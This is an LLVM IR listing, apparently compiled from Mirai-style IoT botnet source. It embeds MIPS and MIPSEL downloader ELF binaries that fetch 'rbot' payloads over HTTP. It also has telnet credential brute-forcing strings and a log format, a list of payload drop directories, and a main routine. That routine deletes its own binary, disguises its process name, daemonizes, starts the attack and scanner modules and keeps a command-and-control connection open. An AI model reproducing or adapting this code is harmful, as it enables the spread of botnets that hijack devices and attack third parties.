!\8F\99\80@\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00<\1C\00\05'\9C\80\A0\03\99\E0!'\BD\FF\E0\AF\BF\00\1C\AF\B0\00\18\AF\BC\00\10\8F\99\804\00\00\00\00\03 \F8\09\00\80\80!\8F\BC\00\10\ACP\00\00\8F\BF\00\1C\8F\B0\00\18$\02\FF\FF\03\E0\00\08'\BD\00 \00\00\00\00\00\00\00\00<\1C\00\05'\9C\80P\03\99\E0!\8F\82\800\03\E0\00\08\00\00\00\00\00\00\00\00\00\00\00\00mips\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mips HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00D\06 \00@\05`\00@\01\9C\00@\02\10\00@\05\10\00@\01(\00@\01t\00@\00\A0\00@\01\C4\00@\00\C8\00@\00\E4\00@\04\A0\00@\01\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00@\00\A0\00\00\00\A0\00\00\04\E0\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00@\05\80\00\00\05\80\00\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\10\00\00\03\00D\05\C0\00\00\05\C0\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00D\06 \00\00\06\14\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\06\14\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\06\14\00\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@.str.19 = private unnamed_addr constant [1921 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00\08\00\01\00\00\00\84\04@\004\00\00\00h\06\00\00\07\10\00\004\00 \00\03\00(\00\07\00\06\00\01\00\00\00\00\00\00\00\00\00@\00\00\00@\00\D4\05\00\00\D4\05\00\00\05\00\00\00\00\00\01\00\01\00\00\00\E0\05\00\00\E0\05D\00\E0\05D\00T\00\00\00p\00\00\00\06\00\00\00\00\00\01\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\FF\00\A50\00,\05\00\00&\04\00% \85\00\FF\00\E70\FF\00\C60% \87\00\002\06\00%0\C4\00\02\22\06\00\00\FF\C30\00\1A\03\00\00\FF\840\00\16\06\00\026\06\00%\10C\00%0\C4\00\08\00\E0\03%\10F\00\05\00\1C<\E4\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A1\0F\04$\05\00\1C<\C8\84\9C'!\E0\99\03\5C\80\99\8F!(\80\00\08\00 \03\A6\0F\04$\05\00\1C<\AC\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A5\0F\04$\05\00\1C<\84\84\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\03\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<8\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A4\0F\04$\05\00\1C<\10\84\9C'!\E0\99\03!\10\A0\00\5C\80\99\8F!8\C0\00!(\80\00!0@\00\08\00 \03\A3\0F\04$\05\00\1C<\E8\83\9C'!\E0\99\03\D0\FF\BD'(\00\BF\AF\10\00\BC\AF\5C\80\99\8F\18\00\A4\AF\1C\00\A5\AF \00\A6\AF\06\10\04$\18\00\A6'\09\F8 \03\01\00\05$\10\00\BC\8F(\00\BF\8F\00\00\00\00\08\00\E0\030\00\BD'\05\00\1C<\9C\83\9C'!\E0\99\03@\FF\BD'\BC\00\BF\AF\B8\00\B2\AF\B4\00\B1\AF\B0\00\B0\AF\10\00\BC\AF\18\80\82\8F\00\00\00\00\A0\05P$\00\00\02\82\00\00\00\00\FD\FF@\14\01\00\10&\FF\FF\10&\02\00\02$\1C\00\A2\A7\00P\02$\1E\00\A2\A7\18\80\82\8FL\80\99\8F\D0\00\07$\B0\00\04$k\00\05$\85\00\06$\A0\05B$\09\F8 \03#\80\02\02\10\00\BC\8F\01\03\05$\18\80\84\8F`\80\99\8F\A8\05\84$\FF\01\06$\09\F8 \03 \00\A2\AF\10\00\BC\8F\02\00\04$P\80\99\8F\02\00\05$!0\00\00\09\F8 \03!\90@\00!\88@\00\FF\FF\02$\10\00\BC\8F\03\00\22\12\00\00\00\00\07\00B\16\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\01\00\04$\10\00\BC\8F\00\00\00\00D\80\99\8F!  \02\1C\00\A5'\09\F8 \03\10\00\06$\10\00\BC\8F\07\00A\04\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03# \02\00\10\00\BC\8F\00\00\00\00\18\80\85\8FH\80\99\8F\17\00\10&\B8\05\A5$!  \02\09\F8 \03!0\00\02\10\00\BC\8F\07\00P\10!\80\00\00T\80\99\8F\00\00\00\00\09\F8 \03\03\00\04$\10\00\BC\8F!\80\00\008\80\99\8F!  \02\18\00\A5'\09\F8 \03\01\00\06$\10\00\BC\8F\01\00\03$T\80\99\8F\04\00C\10\04\00\04$\09\F8 \03\00\00\00\00\10\00\BC\8F\18\00\A3\83\00\12\10\00%\80C\00\0A\0D\02<\0A\0DB4\ED\FF\02\16\00\00\00\008\80\99\8F,\00\B0'!  \02!(\00\02\09\F8 \03\80\00\06$\10\00\BC\8F!(\00\02H\80\99\8F!0@\00\06\00@\18! @\02\09\F8 \03\00\00\00\00\10\00\BC\8F\F0\FF\00\10\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03!  \02\10\00\BC\8F\00\00\00\00X\80\99\8F\00\00\00\00\09\F8 \03! @\02\10\00\BC\8F\00\00\00\00T\80\99\8F\00\00\00\00\09\F8 \03\05\00\04$\10\00\BC\8F\BC\00\BF\8F\B8\00\B2\8F\B4\00\B1\8F\B0\00\B0\8F\08\00\E0\03\C0\00\BD'\05\00\1C<L\81\9C'!\E0\99\03!\00\E0\03\01\00\11\04\00\00\00\00\05\00\1C<4\81\9C'!\E0\9F\03!\F8\00\00<\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\10\81\9C'!\E0\99\03!\10\80\00! \A0\00!(\C0\00!0\E0\00\10\00\A7\8F\14\00\A8\8F\18\00\A9\8F\1C\00\AA\8F\E0\FF\BD'\10\00\A8\AF\14\00\A9\AF\18\00\AA\AF\1C\00\A2\AF\1C\00\A2\8F\0C\00\00\00\03\00\E0\14 \00\BD'\08\00\E0\03\00\00\00\00! @\00@\80\99\8F\00\00\00\00\08\00 \03\00\00\00\00\00\00\00\00\05\00\1C<\A0\80\9C'!\E0\99\03\E0\FF\BD'\1C\00\BF\AF\18\00\B0\AF\10\00\BC\AF4\80\99\8F\00\00\00\00\09\F8 \03!\80\80\00\10\00\BC\8F\00\00P\AC\1C\00\BF\8F\18\00\B0\8F\FF\FF\02$\08\00\E0\03 \00\BD'\00\00\00\00\00\00\00\00\05\00\1C<P\80\9C'!\E0\99\030\80\82\8F\08\00\E0\03\00\00\00\00\00\00\00\00\00\00\00\00mpsl\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.mpsl HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\80\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00@\06D\00\80\05@\00\C0\01@\004\02@\000\05@\00L\01@\00\98\01@\00\A0\00@\00\E8\01@\00\EC\00@\00\08\01@\00\C0\04@\00$\01@\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\A0\00@\00\A0\00\00\00\00\05\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\A0\05@\00\A0\05\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\00\00\00\03\00\00\10\E0\05D\00\E0\05\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00\00\00@\06D\004\06\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\004\06\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\004\06\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.148 = private unnamed_addr constant [11 x i8] c"sage: wget\00", align 1
@.str.149 = private unnamed_addr constant [11 x i8] c"sage: tftp\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.1.5 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.2.6 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.3.7 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.4.8 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.7 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"/bin/\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"/etc/\00", align 1
@.str.11 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.12 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.13 = private unnamed_addr constant [11 x i8] c"/var/Sofia\00", align 1
@.str.14 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"FINISHED\00", align 1
@.str.129 = private unnamed_addr constant [7 x i8] c"BRUTED\00", align 1
@.str.127 = private unnamed_addr constant [68 x i8] c"[%d.%d.%d.%d:23] [%s:%s] [%s] [Status:%s] [Method:%d] [Attempt #%d]\00", align 1
@.str.136 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.137 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.138 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.131 = private unnamed_addr constant [5 x i8] c"\7FELF\00", align 1
@.str.132 = private unnamed_addr constant [6 x i8] c"arm64\00", align 1
@.str.133 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.134 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.135 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.139 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.140 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.141 = private unnamed_addr constant [10 x i8] c"ncomplete\00", align 1
@.str.142 = private unnamed_addr constant [15 x i8] c"attempt failed\00", align 1
@.str.143 = private unnamed_addr constant [6 x i8] c"% Bad\00", align 1
@.str.15 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.144 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.145 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.146 = private unnamed_addr constant [4 x i8] c"ser\00", align 1
@.str.147 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@auth_table_max_weight = global i16 0, align 2
@auth_table_len = global i32 0, align 4
@auth_table = global %struct.scanner_auth* null, align 8

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [32 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.__sigset_t, align 8
  %10 = alloca %struct.__sigset_t, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca %struct.sockaddr_in, align 4
  %21 = alloca i32, align 4
  %22 = alloca %union.__SOCKADDR_ARG, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca i16, align 2
  %28 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  %29 = load i8**, i8*** %5, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @unlink(i8* %31) #7
  %33 = call i32 @sigemptyset(%struct.__sigset_t* %9) #7
  %34 = call i32 @sigaddset(%struct.__sigset_t* %9, i32 2) #7
  %35 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %9, %struct.__sigset_t* null) #7
  %36 = call void (i32)* @signal(i32 17, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %37 = call void (i32)* @signal(i32 1, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %38 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i32 0, i32 0)) #7
  call void @table_init()
  call void @ensure_single_instance()
  call void @rand_init()
  %39 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 32, i32 16, i1 false)
  %40 = load i32, i32* %4, align 4
  %41 = icmp eq i32 %40, 2
  br i1 %41, label %42, label %62

; <label>:42:                                     ; preds = %2
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @util_strlen(i8* %45)
  %47 = icmp slt i32 %46, 32
  br i1 %47, label %48, label %62

; <label>:48:                                     ; preds = %42
  %49 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %50 = load i8**, i8*** %5, align 8
  %51 = getelementptr inbounds i8*, i8** %50, i64 1
  %52 = load i8*, i8** %51, align 8
  %53 = call i32 @util_strcpy(i8* %49, i8* %52)
  %54 = load i8**, i8*** %5, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  %60 = call i32 @util_strlen(i8* %59)
  %61 = sext i32 %60 to i64
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 %61, i32 1, i1 false)
  br label %65

; <label>:62:                                     ; preds = %42, %2
  %63 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %64 = call i32 @util_strcpy(i8* %63, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0))
  br label %65

; <label>:65:                                     ; preds = %62, %48
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 0
  %68 = load i8*, i8** %67, align 8
  %69 = call i32 @util_strcpy(i8* %68, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i32 0, i32 0))
  %70 = call i32 (i32, ...) @prctl(i32 15, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.2, i32 0, i32 0)) #7
  %71 = call i32 @fork() #7
  store i32 %71, i32* @pid1, align 4
  %72 = load i32, i32* @pid1, align 4
  %73 = icmp ne i32 %72, 0
  br i1 %73, label %74, label %75

; <label>:74:                                     ; preds = %65
  call void @exit(i32 1) #8
  unreachable

; <label>:75:                                     ; preds = %65
  %76 = call i32 @fork() #7
  store i32 %76, i32* @pid2, align 4
  %77 = load i32, i32* @pid2, align 4
  %78 = icmp ne i32 %77, 0
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %75
  call void @exit(i32 1) #8
  unreachable

; <label>:80:                                     ; preds = %75
  %81 = call i32 @setsid() #7
  store i32 %81, i32* %7, align 4
  %82 = call i32 @close(i32 0)
  %83 = call i32 @close(i32 1)
  %84 = call i32 @close(i32 2)
  %85 = call signext i8 @attack_init()
  call void (...) bitcast (void ()* @scanner_init to void (...)*)()
  br label %86

; <label>:86:                                     ; preds = %371, %350, %344, %309, %304, %298, %168, %80
  br label %87

; <label>:87:                                     ; preds = %86
  %88 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %89 = getelementptr inbounds [16 x i64], [16 x i64]* %88, i64 0, i64 0
  %90 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %89) #7, !srcloc !1
  %91 = extractvalue { i64, i64* } %90, 0
  %92 = extractvalue { i64, i64* } %90, 1
  %93 = trunc i64 %91 to i32
  store i32 %93, i32* %15, align 4
  %94 = ptrtoint i64* %92 to i64
  %95 = trunc i64 %94 to i32
  store i32 %95, i32* %16, align 4
  br label %96

; <label>:96:                                     ; preds = %87
  br label %97

; <label>:97:                                     ; preds = %96
  %98 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %99 = getelementptr inbounds [16 x i64], [16 x i64]* %98, i64 0, i64 0
  %100 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %99) #7, !srcloc !2
  %101 = extractvalue { i64, i64* } %100, 0
  %102 = extractvalue { i64, i64* } %100, 1
  %103 = trunc i64 %101 to i32
  store i32 %103, i32* %17, align 4
  %104 = ptrtoint i64* %102 to i64
  %105 = trunc i64 %104 to i32
  store i32 %105, i32* %18, align 4
  br label %106

; <label>:106:                                    ; preds = %97
  %107 = load i32, i32* @fd_ctrl, align 4
  %108 = icmp ne i32 %107, -1
  br i1 %108, label %109, label %121

; <label>:109:                                    ; preds = %106
  %110 = load i32, i32* @fd_ctrl, align 4
  %111 = srem i32 %110, 64
  %112 = zext i32 %111 to i64
  %113 = shl i64 1, %112
  %114 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %115 = load i32, i32* @fd_ctrl, align 4
  %116 = sdiv i32 %115, 64
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [16 x i64], [16 x i64]* %114, i64 0, i64 %117
  %119 = load i64, i64* %118, align 8
  %120 = or i64 %119, %113
  store i64 %120, i64* %118, align 8
  br label %121

; <label>:121:                                    ; preds = %109, %106
  %122 = load i32, i32* @fd_serv, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  call void @establish_connection()
  br label %125

; <label>:125:                                    ; preds = %124, %121
  %126 = load i8, i8* @pending_connection, align 1
  %127 = icmp ne i8 %126, 0
  br i1 %127, label %128, label %140

; <label>:128:                                    ; preds = %125
  %129 = load i32, i32* @fd_serv, align 4
  %130 = srem i32 %129, 64
  %131 = zext i32 %130 to i64
  %132 = shl i64 1, %131
  %133 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %134 = load i32, i32* @fd_serv, align 4
  %135 = sdiv i32 %134, 64
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds [16 x i64], [16 x i64]* %133, i64 0, i64 %136
  %138 = load i64, i64* %137, align 8
  %139 = or i64 %138, %132
  store i64 %139, i64* %137, align 8
  br label %152

; <label>:140:                                    ; preds = %125
  %141 = load i32, i32* @fd_serv, align 4
  %142 = srem i32 %141, 64
  %143 = zext i32 %142 to i64
  %144 = shl i64 1, %143
  %145 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %146 = load i32, i32* @fd_serv, align 4
  %147 = sdiv i32 %146, 64
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds [16 x i64], [16 x i64]* %145, i64 0, i64 %148
  %150 = load i64, i64* %149, align 8
  %151 = or i64 %150, %144
  store i64 %151, i64* %149, align 8
  br label %152

; <label>:152:                                    ; preds = %140, %128
  %153 = load i32, i32* @fd_ctrl, align 4
  %154 = load i32, i32* @fd_serv, align 4
  %155 = icmp sgt i32 %153, %154
  br i1 %155, label %156, label %158

; <label>:156:                                    ; preds = %152
  %157 = load i32, i32* @fd_ctrl, align 4
  store i32 %157, i32* %13, align 4
  br label %160

; <label>:158:                                    ; preds = %152
  %159 = load i32, i32* @fd_serv, align 4
  store i32 %159, i32* %13, align 4
  br label %160

; <label>:160:                                    ; preds = %158, %156
  %161 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %161, align 8
  %162 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 10, i64* %162, align 8
  %163 = load i32, i32* %13, align 4
  %164 = add nsw i32 %163, 1
  %165 = call i32 @select(i32 %164, %struct.__sigset_t* %10, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %165, i32* %14, align 4
  %166 = load i32, i32* %14, align 4
  %167 = icmp eq i32 %166, -1
  br i1 %167, label %168, label %169

; <label>:168:                                    ; preds = %160
  br label %86

; <label>:169:                                    ; preds = %160
  %170 = load i32, i32* %14, align 4
  %171 = icmp eq i32 %170, 0
  br i1 %171, label %172, label %182

; <label>:172:                                    ; preds = %169
  store i16 0, i16* %19, align 2
  %173 = load i32, i32* %8, align 4
  %174 = add nsw i32 %173, 1
  store i32 %174, i32* %8, align 4
  %175 = srem i32 %173, 6
  %176 = icmp eq i32 %175, 0
  br i1 %176, label %177, label %181

; <label>:177:                                    ; preds = %172
  %178 = load i32, i32* @fd_serv, align 4
  %179 = bitcast i16* %19 to i8*
  %180 = call i64 @send(i32 %178, i8* %179, i64 2, i32 16384)
  br label %181

; <label>:181:                                    ; preds = %177, %172
  br label %182

; <label>:182:                                    ; preds = %181, %169
  br label %183

; <label>:183:                                    ; preds = %182
  %184 = load i32, i32* @fd_ctrl, align 4
  %185 = icmp ne i32 %184, -1
  br i1 %185, label %186, label %211

; <label>:186:                                    ; preds = %183
  %187 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %188 = load i32, i32* @fd_ctrl, align 4
  %189 = sdiv i32 %188, 64
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds [16 x i64], [16 x i64]* %187, i64 0, i64 %190
  %192 = load i64, i64* %191, align 8
  %193 = load i32, i32* @fd_ctrl, align 4
  %194 = srem i32 %193, 64
  %195 = zext i32 %194 to i64
  %196 = shl i64 1, %195
  %197 = and i64 %192, %196
  %198 = icmp ne i64 %197, 0
  br i1 %198, label %199, label %211

; <label>:199:                                    ; preds = %186
  store i32 16, i32* %21, align 4
  %200 = load i32, i32* @fd_ctrl, align 4
  %201 = bitcast %union.__SOCKADDR_ARG* %22 to %struct.sockaddr**
  %202 = bitcast %struct.sockaddr_in* %20 to %struct.sockaddr*
  store %struct.sockaddr* %202, %struct.sockaddr** %201, align 8
  %203 = getelementptr inbounds %union.__SOCKADDR_ARG, %union.__SOCKADDR_ARG* %22, i32 0, i32 0
  %204 = load %struct.sockaddr*, %struct.sockaddr** %203, align 8
  %205 = call i32 @accept(i32 %200, %struct.sockaddr* %204, i32* %21)
  call void @scanner_kill()
  %206 = load i32, i32* @maintain_thread, align 4
  %207 = call i32 @kill(i32 %206, i32 9) #7
  call void @attack_kill_all()
  %208 = load i32, i32* %7, align 4
  %209 = mul nsw i32 %208, -1
  %210 = call i32 @kill(i32 %209, i32 9) #7
  call void @exit(i32 0) #8
  unreachable

; <label>:211:                                    ; preds = %186, %183
  %212 = load i8, i8* @pending_connection, align 1
  %213 = icmp ne i8 %212, 0
  br i1 %213, label %214, label %262

; <label>:214:                                    ; preds = %211
  store i8 0, i8* @pending_connection, align 1
  %215 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %216 = load i32, i32* @fd_serv, align 4
  %217 = sdiv i32 %216, 64
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds [16 x i64], [16 x i64]* %215, i64 0, i64 %218
  %220 = load i64, i64* %219, align 8
  %221 = load i32, i32* @fd_serv, align 4
  %222 = srem i32 %221, 64
  %223 = zext i32 %222 to i64
  %224 = shl i64 1, %223
  %225 = and i64 %220, %224
  %226 = icmp ne i64 %225, 0
  br i1 %226, label %228, label %227

; <label>:227:                                    ; preds = %214
  call void @teardown_connection()
  br label %261

; <label>:228:                                    ; preds = %214
  store i32 0, i32* %23, align 4
  store i32 4, i32* %24, align 4
  %229 = load i32, i32* @fd_serv, align 4
  %230 = bitcast i32* %23 to i8*
  %231 = call i32 @getsockopt(i32 %229, i32 1, i32 4, i8* %230, i32* %24) #7
  %232 = load i32, i32* %23, align 4
  %233 = icmp ne i32 %232, 0
  br i1 %233, label %234, label %241

; <label>:234:                                    ; preds = %228
  %235 = load i32, i32* @fd_serv, align 4
  %236 = call i32 @close(i32 %235)
  store i32 -1, i32* @fd_serv, align 4
  %237 = call i32 @rand_next()
  %238 = urem i32 %237, 10
  %239 = add i32 %238, 1
  %240 = call i32 @sleep(i32 %239)
  br label %260

; <label>:241:                                    ; preds = %228
  %242 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %243 = call i32 @util_strlen(i8* %242)
  %244 = trunc i32 %243 to i8
  store i8 %244, i8* %25, align 1
  %245 = call i32 @util_local_addr()
  store i32 %245, i32* @LOCAL_ADDR, align 4
  %246 = load i32, i32* @fd_serv, align 4
  %247 = call i64 @send(i32 %246, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i32 0, i32 0), i64 4, i32 16384)
  %248 = load i32, i32* @fd_serv, align 4
  %249 = call i64 @send(i32 %248, i8* %25, i64 1, i32 16384)
  %250 = load i8, i8* %25, align 1
  %251 = zext i8 %250 to i32
  %252 = icmp sgt i32 %251, 0
  br i1 %252, label %253, label %259

; <label>:253:                                    ; preds = %241
  %254 = load i32, i32* @fd_serv, align 4
  %255 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i32 0, i32 0
  %256 = load i8, i8* %25, align 1
  %257 = zext i8 %256 to i64
  %258 = call i64 @send(i32 %254, i8* %255, i64 %257, i32 16384)
  br label %259

; <label>:259:                                    ; preds = %253, %241
  br label %260

; <label>:260:                                    ; preds = %259, %234
  br label %261

; <label>:261:                                    ; preds = %260, %227
  br label %371

; <label>:262:                                    ; preds = %211
  %263 = load i32, i32* @fd_serv, align 4
  %264 = icmp ne i32 %263, -1
  br i1 %264, label %265, label %370

; <label>:265:                                    ; preds = %262
  %266 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %10, i32 0, i32 0
  %267 = load i32, i32* @fd_serv, align 4
  %268 = sdiv i32 %267, 64
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds [16 x i64], [16 x i64]* %266, i64 0, i64 %269
  %271 = load i64, i64* %270, align 8
  %272 = load i32, i32* @fd_serv, align 4
  %273 = srem i32 %272, 64
  %274 = zext i32 %273 to i64
  %275 = shl i64 1, %274
  %276 = and i64 %271, %275
  %277 = icmp ne i64 %276, 0
  br i1 %277, label %278, label %370

; <label>:278:                                    ; preds = %265
  %279 = call i32* @__errno_location() #9
  store i32 0, i32* %279, align 4
  %280 = load i32, i32* @fd_serv, align 4
  %281 = bitcast i16* %27 to i8*
  %282 = call i64 @recv(i32 %280, i8* %281, i64 2, i32 16386)
  %283 = trunc i64 %282 to i32
  store i32 %283, i32* %26, align 4
  %284 = load i32, i32* %26, align 4
  %285 = icmp eq i32 %284, -1
  br i1 %285, label %286, label %301

; <label>:286:                                    ; preds = %278
  %287 = call i32* @__errno_location() #9
  %288 = load i32, i32* %287, align 4
  %289 = icmp eq i32 %288, 11
  br i1 %289, label %298, label %290

; <label>:290:                                    ; preds = %286
  %291 = call i32* @__errno_location() #9
  %292 = load i32, i32* %291, align 4
  %293 = icmp eq i32 %292, 11
  br i1 %293, label %298, label %294

; <label>:294:                                    ; preds = %290
  %295 = call i32* @__errno_location() #9
